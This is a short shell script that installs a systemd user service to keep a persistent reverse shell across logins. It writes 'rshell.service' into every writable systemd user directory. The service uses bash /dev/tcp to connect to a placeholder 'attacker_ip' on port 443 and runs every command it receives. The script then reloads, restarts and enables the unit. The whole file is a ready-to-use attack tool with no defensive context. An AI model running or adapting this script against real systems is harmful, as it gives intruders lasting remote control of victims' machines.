#!/bin/sh
# systemd bash /dev/tcp reverse shell on login

IP="attacker_ip"
PORT="443"
SYSTEMD_PATH="/usr/lib/systemd/user/ $HOME/.local/share/systemd/user/ /etc/systemd/user/ $HOME/.config/systemd/user/ $XDG_RUNTIME_DIR/systemd/user/"
W_PATH=""
UNIT="rshell.service"
UNIT_CONTENT="[Unit]
Description=Y are pwned

[Service]
RemainAfterExit=yes
Type=simple
ExecStart=/bin/bash -c \"exec 5<>/dev/tcp/$IP/$PORT; cat <&5 | while read line; do \$line 2>&5 >&5; done\"

[Install]
WantedBy=default.target"
for i in $SYSTEMD_PATH; do
        mkdir -p "$i"
        if [ -w "$i" ]; then W_PATH="${i%/} $W_PATH"; fi
done

for k in $W_PATH; do
        echo "$UNIT_CONTENT" > "$k/$UNIT"
	echo "[*] created rshell in '$k/$UNIT"
done
systemctl --user daemon-reload
systemctl --user restart $UNIT > /dev/null
systemctl --user enable $UNIT
